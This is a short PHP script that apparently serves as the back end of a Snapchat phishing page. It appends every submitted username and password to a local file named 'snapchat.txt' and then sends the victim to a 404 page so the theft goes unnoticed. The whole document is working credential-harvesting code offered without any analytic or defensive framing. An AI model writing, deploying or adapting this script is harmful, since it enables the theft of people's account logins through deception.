<?php

file_put_contents("snapchat.txt", "Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ../404.html');
exit();
?>
